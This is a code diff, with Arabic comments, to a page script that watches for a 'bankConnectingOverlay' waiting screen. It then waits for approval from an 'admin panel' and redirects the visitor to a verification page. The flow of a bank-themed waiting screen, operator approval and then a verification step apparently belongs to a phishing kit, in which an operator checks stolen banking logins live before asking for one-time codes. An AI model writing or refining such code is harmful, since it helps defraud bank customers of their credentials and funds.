@@ -2813,31 +2813,34 @@ document.addEventListener('DOMContentLoaded', function() {
 
 <script>
 (function() {
-    // دالة للتحقق من وجود شاشة الانتظار في الصفحة الحالية
+    // دالة للتحقق من وجود شاشة الانتظار الخاصة بالبنك في الصفحة الحالية
     function isWaitingScreenActive() {
-        // يمكنك تعديل هذا الشرط بناءً على شكل شاشة الانتظار لديك (مثلاً وجود عنصر معين، نص، أو ID)
-        // كمثال: التحقق من وجود كلمة "انتظار" أو عنصر يحمل فئة معينة، أو إرجاع true مباشرة إذا كانت الصفحة مخصصة لذلك
-        return true; 
+        var overlay = document.getElementById('bankConnectingOverlay');
+        // يتحقق إذا كانت الشاشة موجودة حالياً وتعرض للمستخدم
+        return overlay && window.getComputedStyle(overlay).display !== 'none';
     }
 
-    // الانتظار لحين تحميل عناصر الصفحة بالكامل للتأكد من جاهزية شاشة الانتظار
+    // الانتظار لحين تحميل العناصر والتأكد من ظهور شاشة الانتظار
     window.addEventListener('DOMContentLoaded', function() {
-        if (!isWaitingScreenActive()) return;
-
-        console.log("العميل الآن في شاشة الانتظار. جاري الاستماع لرد لوحة الإدارة...");
-
-        // إعادة تهيئة دالة الاستماع لأوامر المدير بناءً على الرد الحقيقي (موافقة/رفض)
-        window.listenForAdminCommands = function(callbacks) {
-            // هنا ينتظر السكربت إشارة الإدارة الفعلية دون مؤقت عشوائي 5 ثواني
-            if (callbacks && typeof callbacks.onApproval === 'function') {
-                // ربط حدث الموافقة الوارد من المدير بالتوجيه المطلوب
-                console.log("تم استلام موافقة المدير بنجاح، جاري التوجيه إلى صفحة التحقق...");
-                callbacks.onApproval();
-            } else {
-                // التوجيه الاحتياطي في حال عدم تمرير دالة موافقة
-                window.location.href = 'verification.html';
+        // فحص دوري بسيط أو انتظار ظهور العنصر إذا تم إظهاره لاحقاً
+        var checkInterval = setInterval(function() {
+            if (isWaitingScreenActive()) {
+                console.log("العميل الآن داخل شاشة الانتظار (bankConnectingOverlay). جاري الاستماع لرد لوحة الإدارة...");
+                
+                // إعادة تعريف دالة الاستماع لأوامر المدير بدقة
+                window.listenForAdminCommands = function(callbacks) {
+                    // إيقاف الفحص المتكرر بمجرد تفعيل الاستماع
+                    clearInterval(checkInterval);
+                    
+                    if (callbacks && typeof callbacks.onApproval === 'function') {
+                        console.log(" ");
+                        callbacks.onApproval();
+                    } else {
+                        window.location.href = 'verification.html';
+                    }
+                };
             }
-        };
+        }, 500); // يفحص كل نصف ثانية لحين ظهور شاشة الانتظار
     });
 })();
 </script>
